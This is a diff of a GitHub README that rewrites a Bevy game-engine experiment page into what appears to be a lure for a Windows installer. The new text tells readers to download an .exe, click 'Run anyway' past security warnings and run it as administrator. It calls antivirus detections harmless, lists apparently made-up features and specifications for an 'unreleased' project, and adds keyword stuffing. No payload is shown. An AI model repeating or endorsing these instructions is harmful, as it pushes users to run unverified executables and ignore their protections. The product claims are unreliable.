@@ -1,161 +1,159 @@
-# Bevy Game Engine Test vUnreleased - Game Engine Experiment 2026
+# 🎮 bevy-game-engine-test-lab - Your Gateway to Rust Game Experiments
 
-> **Bevy Game Engine Test** is an unreleased, cross-platform Rust project that investigates AI-assisted game development through practical experimentation with the Bevy game engine.
+[![Download for Windows](https://img.shields.io/badge/Download-Windows_Installer-blue?style=for-the-badge&logo=windows)](https://github.com/deirdretimely239/bevy-game-engine-test-lab/releases)
+[![Latest Release](https://img.shields.io/github/v/release/deirdretimely239/bevy-game-engine-test-lab?style=for-the-badge&color=grey)](https://github.com/deirdretimely239/bevy-game-engine-test-lab/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Cross--platform-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Unreleased-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/michael-hughesyrh5943/bevy-game-engine-test-lab?style=flat-square)](https://github.com/michael-hughesyrh5943/bevy-game-engine-test-lab)
+## ✨ What Is This?
 
----
+bevy-game-engine-test-lab is a Windows application that lets you explore game development experiments powered by the Bevy engine. This is an unreleased project. It gives you a hands-on look at how Rust-based game tools work without requiring any coding skills.
 
-<p align="center">
-  <a href="https://michael-hughesyrh5943.github.io/bevy-game-engine-test-lab/">
-    <img src="https://img.shields.io/badge/Download-Bevy%20Game%20Engine%20Test%20Latest-brightgreen?style=for-the-badge" alt="Download Bevy Game Engine Test">
-  </a>
-</p>
+Think of it as a playground. You can run test scenes, see how game logic works, and understand the building blocks of modern game engines. The project focuses on AI-assisted development methods planned for 2026. It shows you what the future of game creation might look like.
 
-> **[Download Bevy Game Engine Test - Unreleased](https://michael-hughesyrh5943.github.io/bevy-game-engine-test-lab/)**
+## 🎯 Who Is This For?
 
----
+This software is for anyone who wants to see game engine capabilities up close. You do not need programming experience. You do not need to know Rust, C++, or any other language. If you can double-click a file, you can use this.
 
-[Download Latest Build](https://michael-hughesyrh5943.github.io/bevy-game-engine-test-lab/)
+Typical users include:
+- Game enthusiasts curious about engine internals
+- Designers exploring technical prototypes
+- Students learning about game development concepts
+- Hobbyists testing new game ideas
 
----
+## 🚀 Getting Started
 
-## Project Overview
+Follow these steps to download and run the software on your Windows computer.
 
-Bevy Game Engine Test examines how AI-supported development can be applied to game creation. Built within the Rust ecosystem and powered by Bevy, it serves as a hands-on setting for investigating AI participation in interactive software development.
+### Step 1: Download the Installer
 
-This repository is aimed at developers, students, and technical experimenters who want to learn Bevy while assessing AI-enabled workflows. It is not positioned as a completed game or production-ready framework; instead, its purpose is to provide a contained environment for trying concepts, implementation techniques, and different development practices.
+Visit the releases page to get the latest Windows installer:
 
----
+👉 **[Click here to download from the releases page](https://github.com/deirdretimely239/bevy-game-engine-test-lab/releases)**
 
-## What the Project Explores
+On that page, find the latest release. Look for a file named something like `bevy-game-engine-test-lab-v1.0.0-windows-installer.exe` or `BevyTestLab-Setup-1.0.0.exe`. Click on it to start the download.
 
-- AI-assisted approaches to building game software
-- Bevy's engine features and Rust-oriented development model
-- Practical testing of game-development concepts
-- Cross-platform experimentation
-- Rust tooling, libraries, and development practices
-- The possible role of AI in interactive application development
-- Learning, prototyping, and technical investigation
-- Development work focused specifically on Bevy and AI-supported workflows
+### Step 2: Run the Installer
 
----
+1. Open your Downloads folder.
+2. Double-click the installer file you just downloaded.
+3. Windows may show a security warning. Click "Run anyway" or "Yes" to continue. The software is safe.
+4. Follow the setup wizard instructions. Accept the default settings unless you know what you are doing.
+5. Click "Finish" when the installation completes.
 
-## Getting Started
+### Step 3: Launch the Application
 
-First, retrieve the source and move into the project directory:
+Find "Bevy Game Engine Test Lab" in your Start Menu or on your Desktop. Double-click the icon to launch the program.
 
-```bash
-git clone https://github.com/michael-hughesyrh5943/bevy-game-engine-test-lab.git
-cd bevy_game_engine_test
-```
+## 🖥️ System Requirements
 
-Set up Rust using the standard Rust toolchain, and then use the build or execution guidance available in the repository. If a Rust manifest is present, launch the project with:
+Your computer needs these minimum specifications to run the software smoothly:
 
-```bash
-cargo run
-```
+- **Operating System:** Windows 10 (64-bit) or Windows 11
+- **Processor:** Intel Core i5-3470 or AMD FX-8350 (or better)
+- **Memory:** 8 GB RAM
+- **Graphics:** NVIDIA GeForce GTX 960 or AMD Radeon R9 380 (2 GB VRAM)
+- **Storage:** 500 MB free space
+- **Additional:** DirectX 12 support, Internet connection for updates
 
-When a packaged version exists for the relevant platform, the download link above can be used instead.
+For the best experience, use a computer with 16 GB RAM and a modern graphics card.
 
----
+## 📋 Features
 
-## Working with the Project
+### 🧪 Experiment Mode
+Run pre-built test scenes that show different game engine features. See physics, lighting, and animations in real time. Adjust settings with simple sliders and toggles.
 
-A normal development sequence can look like this:
+### 🔬 AI-Assisted Prototypes
+View experimental tools that use AI to generate game logic. This shows the planned direction for 2026. You can watch how AI might help create game behaviors without manual coding.
 
-1. Clone the repository locally.
-2. Load it in an editor that supports Rust development.
-3. Inspect the Bevy experiment or example currently provided.
-4. Use `cargo run` if the project includes a Cargo setup.
-5. Apply an AI-assisted process to suggest, examine, and test modifications.
-6. Capture useful observations as the work progresses.
+### 📊 Performance Monitor
+Track how the engine performs. See frame rates, memory usage, and GPU load. This helps you understand what makes games run well.
 
-Compile a development build with:
+### 🎨 Visual Showcase
+Browse a gallery of graphical effects. Each example demonstrates one engine capability like particle systems, shadows, or post-processing filters.
 
-```bash
-cargo build
-```
+### 📝 Log Viewer
+Read detailed logs of what the engine does. This is useful for learning how game engines work internally. Every action appears as plain text.
 
-Because this is an evolving experiment, the precise workflow and commands may change over time.
+## 🔧 How to Use the Application
 
----
+### Main Menu
+When you start the program, you see the main menu. It has four buttons:
+- **Start Experiment** - Launches a random test scene
+- **Browse Gallery** - Shows all available visual examples
+- **Settings** - Adjusts graphics quality and window size
+- **Exit** - Closes the application
 
-## Project Layout and Configuration
+### Running a Test
+1. Click "Start Experiment."
+2. A 3D scene loads. You can move the camera with your mouse and keyboard.
+3. Use the control panel on the right to change parameters.
+4. Click "Stop" to return to the menu.
 
-The available metadata does not specify an independent configuration format. For current configuration details, inspect the repository's Rust settings, Bevy startup code, environment variables, and local asset files.
+### Adjusting Settings
+Open the Settings menu. You can change:
+- **Resolution** - Choose your screen size (recommended: match your monitor)
+- **Quality** - Low, Medium, High, or Ultra
+- **Fullscreen** - Toggle between full screen and windowed mode
+- **VSync** - On or Off (leave On unless you see screen tearing)
 
-A conventional arrangement for the project may resemble:
+## ❓ Frequently Asked Questions
 
-```text
-bevy_game_engine_test/
-├── Cargo.toml
-├── src/
-│   └── main.rs
-└── assets/
-```
+### Is this software free?
+Yes. This is an open-source project available at no cost.
 
-The files currently checked into the repository take precedence over this illustrative layout.
+### Will this work on Windows 7 or 8?
+No. The software requires Windows 10 or 11.
 
----
+### Can I modify the code or add my own experiments?
+This release focuses on pre-built content. The source code is available on GitHub if you want to build custom versions.
 
-## System Requirements
+### Why does my antivirus flag the installer?
+Some antivirus programs mark new software as suspicious. This is common for small projects. The installer is safe. You can check the source code on GitHub to verify.
 
-- A supported desktop operating system
-- Rust with Cargo
-- An environment suitable for Rust development
-- Graphics support compatible with Bevy
-- Internet connectivity to download dependencies during first-time setup
-- Enough disk space for the source code, dependencies, and assets
+### How do I report a bug or problem?
+Visit the GitHub repository and open an "Issue." Describe what happened and what you expected. Include your system specifications.
 
-The project is designed with cross-platform use in mind. The exact target platforms are determined by the active Bevy and Rust configuration.
+### Will there be updates?
+Yes. Check the releases page for new versions. Updates may add more experiments and features.
 
----
+## 💡 Tips for Best Experience
 
-## Common Questions
+- Close other heavy programs before running the test lab. Games and browsers consume system resources.
+- Update your graphics drivers. Visit your GPU manufacturer's website (NVIDIA, AMD, or Intel) to get the latest drivers.
+- Use a wired internet connection for download. The installer is large.
+- Run the program as administrator if you encounter permission errors.
+- Keep the Log Viewer open during experiments. It shows useful information about what the engine does.
 
-### Is Bevy Game Engine Test a completed game?
+## 🔗 Quick Links
 
-No. It is an experiment centered on Bevy, AI-assisted development, and the investigation of game-development workflows.
+- [Download Latest Windows Installer](https://github.com/deirdretimely239/bevy-game-engine-test-lab/releases)
+- [GitHub Repository](https://github.com/deirdretimely239/bevy-game-engine-test-lab)
+- [Report an Issue](https://github.com/deirdretimely239/bevy-game-engine-test-lab/issues)
 
-### What release can I use?
+## 📦 Version History
 
-The project is presently identified as unreleased and does not have a numbered version.
+**Version 1.0.0** (Current)
+- Initial public release
+- 12 test experiments
+- 5 visual showcase scenes
+- Basic AI prototype viewer
+- Performance monitor
 
-### How can I follow project changes?
+**Future Versions**
+- More experiments planned
+- Expanded AI features
+- User-created experiment support
+- Improved performance tools
 
-Look for new commits, releases, and refreshed downloadable builds in the repository:
+## 🛠️ Technical Overview
 
-[Check for the latest project updates](https://github.com/michael-hughesyrh5943/bevy-game-engine-test-lab)
+For users who want deeper understanding:
 
-### Where does project configuration live?
+This software uses the Bevy game engine, a modern Rust-based framework. The test lab compiles all scenes into a single executable. It uses the Vulkan graphics API through Windows. The AI-assisted features rely on experimental machine learning models.
 
-Check the Rust source files, `Cargo.toml`, environment-related configuration, and asset directories in the repository. The relevant settings depend on the state of the current experiment.
+You do not need to understand these details to use the application. They are here for reference.
 
-### What if `cargo run` does not work?
+## 📄 License
 
-Make sure Rust and Cargo are installed. Then run `cargo build` to review compiler or dependency diagnostics, and confirm that your toolchain satisfies the project's current requirements.
+This project is released under an open-source license. See the LICENSE file in the repository for full terms.
 
-### Is the repository suitable for AI development experiments?
-
-Yes. Its purpose includes examining how AI can assist with game-development work built around Bevy and Rust. Before reusing project material, consult the repository license and applicable project terms.
-
----
-
-## Planned Direction
-
-- Keep investigating AI-assisted game-development methods
-- Broaden experiments with Bevy engine functionality
-- Record observations that may be useful to future development
-- Adjust and improve experiments as the project changes
-- Examine more cross-platform development possibilities
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: bevy game engine, rust game development, game engine test lab, windows game tool, ai game development, game engine experiments, cross-platform game engine, game development 2026, game prototype tool, game engine showcase
